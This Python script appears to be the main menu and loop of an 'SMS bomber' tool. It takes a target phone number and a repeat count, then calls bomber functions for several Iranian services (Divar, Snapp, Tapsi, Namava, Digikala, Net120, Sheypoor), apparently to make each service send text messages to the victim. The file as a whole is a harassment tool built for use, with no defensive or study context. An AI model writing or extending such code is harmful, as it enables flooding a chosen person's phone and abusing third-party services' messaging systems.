import requests
from time import sleep
from colorama import Fore as color
from modules import namava, digikala, net120, sheypoor, tapsi, divar, snap
from menu import menu
import os

bold = '\033[1m'
end = '\033[0m'
while True:

    try:
        os.system('clear')
        menu.banner()
        menu.menu_respaws()
        user_input = input(color.WHITE + "Enter Your Choice => ")
        if (user_input == '1'):
            os.system('clear')
            menu.banner()
            print(color.RED + "[*] Enter the number without -[0,98].")
            try:
                number = input(color.LIGHTRED_EX + "[+] Enter the target phone number :")
            except:
                print(color.LIGHTBLUE_EX + "[*] " + "Please Enter The Phone Number....")
                sleep(1)
                break
            try:
                user_input_loop = int(input(color.LIGHTCYAN_EX + "[+] How many times you want to send messages? => "))
            except:
                print(color.RED + "Enter number....")
                sleep(1)
                break
            try:
                print("""{0}COUNT \t\t {1}Time """.format(bold, bold))
                sms = 1
                for i in range(user_input_loop):
                    print(color.LIGHTGREEN_EX + end + str(sms), end=' ');
                    divar.divar_bomber(number)
                    sms += 1
                    sleep(3)
                    print(color.LIGHTGREEN_EX + end + str(sms), end=' ');
                    snap.snap_bomber(number)
                    sms += 1
                    sleep(3)
                    print(color.LIGHTGREEN_EX + end + str(sms), end=' ');
                    tapsi.tapsi_bomber(number)
                    sms += 1
                    sleep(3)
                    print(color.LIGHTGREEN_EX + end + str(sms), end=' ');
                    namava.namava_bomber(number)
                    sms += 1
                    sleep(2.5)
                    print(color.LIGHTGREEN_EX + end + str(sms), end=' ');
                    digikala.digikala_bomber(number)
                    sms += 1
                    sleep(2.5)
                    print(color.LIGHTGREEN_EX + end + str(sms), end=' ');
                    net120.net120_bomber(number)
                    sms += 1
                    sleep(2.5)
                    print(color.LIGHTGREEN_EX + end + str(sms), end=' ');
                    sheypoor.sheypoor_bomber(number)
                    sms += 1
                    sleep(2.5)

                print(color.LIGHTYELLOW_EX + end + "[+] Done...")
                sleep(5)
            except:
                print(color.RED + "[-] Something bad happend....")
                sleep(1)
                raise
                break


        elif (user_input == '0'):
            print(color.WHITE + "[*] Thanks for being here....")
            sleep(1)
            break
        else:
            print(color.RED + "Something went Wrong...")
            sleep(1)
            break
    except:
        print(color.RED + "[-] Something Went Wrong...")
        sleep(1)
        raise
        break




